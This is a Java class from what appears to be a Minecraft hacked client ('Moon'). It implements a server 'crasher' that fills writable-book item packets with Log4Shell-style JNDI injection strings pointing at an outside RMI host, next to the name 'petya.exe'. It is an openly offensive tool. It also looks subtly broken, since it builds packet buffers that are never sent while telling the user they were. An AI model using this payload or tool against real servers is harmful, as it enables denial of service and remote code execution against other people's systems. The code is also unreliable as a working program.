package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;

@CrashInfo(
        name = "feno4"
)
public class CrashFeno4 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Feno crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int i = 0; i < packets; ++i) {
                NBTTagCompound comp = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                for (int i2 = 0; i2 < 1; i2++)
                    list.appendTag(new NBTTagString("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
                comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
                comp.setString("title", "Moon");
                comp.setByte("resolved", (byte) 1);
                comp.setTag("pages", list);
                ItemStack stack = new ItemStack(Items.writable_book);
                stack.setTagCompound(comp);
                PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
                buffer.writeItemStackToBuffer(stack);
            }
        })).start();


        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
